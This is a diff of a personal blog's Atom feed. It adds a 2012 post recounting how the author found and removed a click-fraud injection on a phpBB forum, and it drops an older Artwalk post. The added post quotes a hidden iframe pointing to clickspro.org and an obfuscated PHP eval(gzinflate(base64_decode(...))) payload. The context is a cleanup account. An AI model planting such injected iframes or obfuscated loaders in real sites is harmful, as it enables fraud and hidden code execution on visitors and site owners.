@@ -4,7 +4,7 @@
   <title><![CDATA[Category: rants | DV Digital]]></title>
   <link href="http://www.dan-vidal.com//blog/categories/rants/atom.xml" rel="self"/>
   <link href="http://www.dan-vidal.com//"/>
-  <updated>2012-09-27T12:40:32-04:00</updated>
+  <updated>2012-09-27T23:28:12-04:00</updated>
   <id>http://www.dan-vidal.com//</id>
   <author>
     <name><![CDATA[Dan Vidal - Pod]]></name>
@@ -12,6 +12,129 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
+    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
+    <updated>2012-09-27T23:34:00-04:00</updated>
+    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
+    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>
+
+<p>Every so often, websites are hacked. Sometimes it's bad, sometimes it's harmless. The usual goal is to infect a viewer's computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of "harmless", are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>
+
+<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can't trust them...</p>
+
+<!-- more -->
+
+
+<p>Why not?</p>
+
+<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it's cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don't add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to "peer over the walls", as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it's hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>
+
+<p>So, people invariably get in.</p>
+
+<p>I first noticed something was amiss when I could not login to the forum's administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser's status bar. The redirects were pointing towards a site called "clickspro.org". Now, since I helped build TNL, I know each and every aspect of it's functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it's been over three years since TNL has explicitly seen any new features.</p>
+
+<p>So, I started a little investigating.</p>
+
+<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn't. I used the UNIX tool "cURL" to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p>This rendered the admin control panel for TNL in it's raw HTML format. Therein, I spotted the offending code:</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p>That does not belong.</p>
+
+<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>
+
+<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>
+
+<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn't find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>
+
+<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>
+
+<p><blockquote><p></p></p><p><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p></p><p><p></p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote></p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>K/5DdO/p8AAAD//w==')));?>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I'm not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don't know what USENET is, Google it.</p>
+
+<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>
+
+<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>
+
+<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>
+
+<p>What mystifies me though, and I'm finally getting to the point of this rant, is that to implement this, it took some doing. This wasn't a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>
+
+<p>A lot of effort, for little return. Clicks, likes, and impressions. It's all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it's an ecommerce site, are people buying anything? If it's a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>
+
+<p>It's sad that people actually pay for this sort of thing. It's why my tactic with regards to web properties I don't explicitly own or have control over is to get people off them as fast as possible. I'll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don't harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I'd rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I'm the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don't play the stats game. I've opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>
+
+<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn't find it so, it's really annoying.</p>
+
+<p>Give me the real data and content.</p>
+
+<p>And to the kid in Manila? Sorry about that. I know you're just doing your job, and it's better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>
+
+<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Some of us are more than that guy with the camera.]]></title>
@@ -195,56 +318,6 @@ Hm, maybe the community spirit is still around in a way. That's something. Wheth
 <p>And yes, this was my non-angry blog post for today. I don't think I got that worked up, did I? And happy fifth birthday Talk Nightlife. You're my contentious little foster child. Also, if you're of a mind and interested, we're putting together a little shindig somewhere on the 28th of September. Keep checking <a href="http://forum.talknightlife.com/viewtopic.php?f=3&t=20004&st=0&sk=t&sd=a">this thread on TNL</a> for details. It's not an official event since we don't do official anything. Oh, and sign up if you want. Just mention you read about TNL on here and I'll process the login right away.</p>
 
 <p>Sidebar (because it is how I write on this blog): Certain details about TNL I've left intentionally vague. Why? Well, anyone with half a brain knows who was originally behind TNL and who put the money in. However, the general feeling at the time was that their involvement be minimized in public, and it was never discussed further as time went on. Those requests still remain in force from where I sit, even if the investing parties don't remember or don't care. I'm "having some class" with regards to that. I'm definitely grateful for their initial involvement though. I got to help raise a bastard child of a website. If I hear otherwise, I'll let you know.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Wynwood Artwalk Too Hot To Handle?]]></title>
-    <link href="http://www.dan-vidal.com//blog/2012/09/08/wynwood-artwalk-too-hot-to-handle/"/>
-    <updated>2012-09-08T23:16:00-04:00</updated>
-    <id>http://www.dan-vidal.com//blog/2012/09/08/wynwood-artwalk-too-hot-to-handle</id>
-    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/artwalk.jpg" width="960" height="960" title="'Artwalk Wynwood Artwalk Miami'" ></p>
-
-<p>Though I guess I could be considered part of the Miami art community, I almost never go to Artwalk in Wynwood. I'm usually busy Saturday nights, or I consider my rare downtime more valuable than bouncing from gallery to gallery, most of which probably wouldn't exhibit anything I do. Photography is sort of underrepresented at Artwalk, but that's for another rant.</p>
-
-<p>So anyways, the rare times I go to it are last-minute call-ups like I did earlier tonight.</p>
-
-<!-- more -->
-
-
-<p>I got a text from my good friend <strong>Emi Guerra</strong>, he wanted to go out and cruise Artwalk and meet some of the Miami art community to tell them about his forthcoming <strong>UR1 Festival</strong>, the big music and art festival taking place on December 8th and 9th during Art Basel. The big announcement of the lineup is Monday, even though it has been leaked. So I won't post it here since you can find it <a href="http://forum.talknightlife.com/">elsewhere.</a>.</p>
-
-<p>But anyways, he wanted to go out and see the artists and art people. Makes sense if you are throwing an art-oriented festival. And, since I'm kinda in touch with these people (am I?) he invited me along.</p>
-
-<p>So, I jumped into the 210 and zipped on down Biscayne to Wynwood.</p>
-
-<p>Once I got to the area, what a bloody mission. Traffic was at a gridlocked standstill, and there were throngs of people out and about, to the point where Northwest 2nd Avenue was a pedestrian thoroughfare. I was supposed to meet Emi and his UR1 team at Wynwood Walls, and I ended up having to park about seven blocks away. I'm a healthy boy now so it's no big deal, but it's the principle. And I will not valet. The 210 isn't an SLS or an E 63, but it's my baby and no one except me and the crew at <a href="http://masterclassauto.com/">Masterclass Auto</a> touches the steering wheel.</p>
-
-<p>Some have called for the major streets of Wynwood to be closed off to automotive traffic during Artwalk. 100 percent, yes. Please. Do this. Commissioner Sarnoff, it's your district (for now), make it happen. The cops have their hands full pushing vehicular and pedestrian traffic around, and it's a complete cluster down there, and it actually hampers the enjoyment of Artwalk.</p>
-
-<p>So yes, Artwalk has truly exploded into a Miami social phenomenon. We officially have an art scene here as far as I'm concerned. Go us.</p>
-
-<p>However, I finally did get situated, and met Emi, along with UR1's Jackie Richie, Emi's assistant Andrea, Alex Martinez of <a href="http://deepsleepstudio.com">Deepsleep</a>, and a few other scene people I know at Wynwood Walls, which was "at capacty" and had this weird dining area with a velvet rope and such set up.</p>
-
-<p>They gotta update the artwork there. It's been the same since I last went to Artwalk (oddly enough with Emi's brother, Eddy) over two years ago. I'll paint a wall. It won't be anything "arty", but it will be something from my mind. I'll mention it here even.</p>
-
-<p>As I mentioned earlier, everyone was out in force. Now, was everyone into the art? Hardly. Most people "Artwalking" couldn't tell you if that was a piece by Nagelbett or Britto. They are out for the social experience. Emi phrased it best when he said, "They are out for something to do, and it's cheap to go to Artwalk. Shit is expensive these days..."</p>
-
-<p>He hit the nail on the head. Shit is expensive these days. Dinner for two will run you $100 or more. A night out at a club, even Space, will run you $100 per person (drinks, cover, and so on) or more if you VIP it. Having fun costs money!</p>
-
-<p>But not at Artwalk. The galleries often have cash bars and/or free (albeit low-quality) booze on hand. They usually arrange a sponsorship or something. And the food trucks are out in force, and the food is cheap, though I wouldn't necessarily trust it. Yeah, the modern food trucks have all the amenities, but it's still a food truck, ya know? We called 'em the "roach coaches" back in Jersey. Note to food truck owners, I'm not saying that your food truck has roaches. If you're that concerned about what I said, you probably have something to hide. Be confident in your product and people talking shit, like me, won't affect your business. Let freedom ring.</p>
-
-<p>But yes, anyways, people are out for Artwalk because it's cheap, interesting, and there's a good social dynamic. And the galleries and artists put up with it since it will get their works exposed to the five percent of the people who actually know their art and are in a position to do something about it.</p>
-
-<p>And yes, please block off the streets. Artwalk is now truly a "phenomenon" and it needs to be handled properly. Our art scene is finally getting some worldwide respect, and it'd be a shame if logistical squabbles killed off a major component of it.</p>
-
-<p>Maybe I should run for the City Commission and make Artwalk one of my campaign platforms...</p>
-
-<p>Dan Vidal For District 2 Commissioner!</p>
-
-<p>Sidebar: Yes, I'm aware the issues mentioned here are old. But these first few articles on my blog are kind of for SEO purposes, as well as stuff that is on my mind, regardless of when it happened. It's my blog, after all.</p>
-
-<p>Sidebar 2: Yes, this devolved into a rant. In a nutshell, I did have fun at Artwalk. The food truck area is a great concept. Get 'em all in one place. Also, good seeing the <a href="http://car2go.com/">Miami Car2Go</a> people out...thanks for the T-shirt guys.</p>
 ]]></content>
   </entry>
   
